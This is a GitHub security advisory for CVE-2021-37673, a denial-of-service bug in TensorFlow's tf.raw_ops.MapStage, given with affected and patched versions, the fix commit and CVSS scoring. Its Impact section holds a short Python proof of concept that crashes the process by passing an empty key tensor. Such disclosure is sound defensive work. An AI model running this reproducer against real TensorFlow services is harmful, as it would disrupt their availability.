{
    "Title": "`CHECK`-fail in `MapStage`",
    "Meta": {
        "Package": [
            "tensorflow([pip](/advisories?query=ecosystem%3Apip))"
        ],
        "Affected versions": [
            "< 2.3.4",
            ">= 2.4.0, < 2.4.3",
            "= 2.5.0"
        ],
        "Patched versions": [
            "2.3.4",
            "2.4.3",
            "2.5.1"
        ]
    },
    "Description": "### Impact\n\nAn attacker can trigger a denial of service via a `CHECK`-fail in\n`tf.raw_ops.MapStage`:\n\n    \n    \n    import tensorflow as tf\n      \n    tf.raw_ops.MapStage(\n      key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),\n      indices=tf.constant((0), dtype=tf.int32),\n      values=[tf.constant((0), dtype=tf.int32)],\n      dtypes=[tf.int32,\n      tf.int64],\n      capacity=0,\n      memory_limit=0,\n      container='',\n      shared_name='')\n\nThe\n[implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L513)\ndoes not check that the `key` input is a valid non-empty tensor.\n\n### Patches\n\nWe have patched the issue in GitHub commit\n[d7de67733925de196ec8863a33445b73f9562d1d](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this\ncommit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these\nare also affected and still in supported range.\n\n### For more information\n\nPlease consult [our security\nguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for\nmore information regarding the security model and how to contact us with\nissues and questions.\n\n### Attribution\n\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu\nX-Team.\n\n### References\n\n  * [GHSA-278g-rq84-9hmg](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-278g-rq84-9hmg \"GHSA-278g-rq84-9hmg\")\n  * <https://nvd.nist.gov/vuln/detail/CVE-2021-37673>\n  * [tensorflow/tensorflow@`d7de677`](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d)\n\n",
    "Severity": {
        "Score": "5.5/ 10 (Moderate)",
        "CVSS base metrics": {
            "Attack vector": "Local",
            "Attack complexity": "Low",
            "Privileges required": "Low",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "None",
            "Integrity": "None",
            "Availability": "High"
        },
        "CVSS string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
    },
    "Weaknesses": [
        "[CWE-20](/advisories?query=cwe%3A20)"
    ],
    "CVE ID": "CVE-2021-37673",
    "GHSA ID": "GHSA-278g-rq84-9hmg",
    "Source code": "[tensorflow/tensorflow](https://github.com/tensorflow/tensorflow)"
}